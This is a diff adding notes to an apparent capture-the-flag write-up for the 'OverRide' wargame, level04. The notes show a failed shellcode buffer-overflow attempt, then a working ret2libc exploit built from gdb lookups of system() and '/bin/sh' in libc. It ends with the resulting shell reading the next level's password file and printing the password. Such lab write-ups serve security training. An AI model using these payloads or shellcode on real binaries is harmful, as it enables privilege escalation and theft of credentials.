@@ -74,10 +74,31 @@ Cannot access memory at address 0x42424242
 $2 = 156
 
 ```
+this syntax with shellcode isn't working for me
+`(python -c 'print "A" * 135 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xff\xff\xd6\x50"[::-1]' ; cat) | ./level04`
 
+ill try ret2libc
+```
+p system
+$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 
-
-
+(gdb) info proc mappings
+   0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+   
+(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
+0xf7f897ec   
+```
+```
+level04@OverRide:~$ (python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "AAAA" + "\xf7\xf8\x97\xec"[::-1]' ; cat) | ./level04
+Give me some shellcode, k
+pwd
+/home/users/level04
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
 
 
 
